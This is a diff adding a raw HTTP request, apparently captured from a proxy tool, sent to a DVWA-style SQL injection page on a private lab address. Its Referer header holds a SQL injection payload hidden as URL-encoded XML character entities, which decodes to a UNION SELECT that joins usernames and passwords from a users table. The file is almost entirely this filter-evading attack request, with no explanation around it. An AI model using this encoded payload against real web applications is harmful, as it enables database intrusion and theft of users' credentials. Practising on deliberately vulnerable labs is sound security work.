@@ -1,0 +1,10 @@
+GET /vulnerabilities/sqli/?id=&Submit=Submit HTTP/1.1
+Host: 10.10.3.128:2280
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.3.128:2280/vulnerabilities/sqli/?id=%3CstoreId%3E%26%2349%3B%26%2332%3B%26%2385%3B%26%2378%3B%26%2373%3B%26%2379%3B%26%2378%3B%26%2332%3B%26%2383%3B%26%2369%3B%26%2376%3B%26%2369%3B%26%2367%3B%26%2384%3B%26%2332%3B%26%23117%3B%26%23115%3B%26%23101%3B%26%23114%3B%26%23110%3B%26%2397%3B%26%23109%3B%26%23101%3B%26%2332%3B%26%23124%3B%26%23124%3B%26%2332%3B%26%2339%3B%26%23126%3B%26%2339%3B%26%2332%3B%26%23124%3B%26%23124%3B%26%2332%3B%26%23112%3B%26%2397%3B%26%23115%3B%26%23115%3B%26%23119%3B%26%23111%3B%26%23114%3B%26%23100%3B%26%2332%3B%26%2370%3B%26%2382%3B%26%2379%3B%26%2377%3B%26%2332%3B%26%23117%3B%26%23115%3B%26%23101%3B%26%23114%3B%26%23115%3B%3C%2FstoreId%3E&Submit=Submit
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
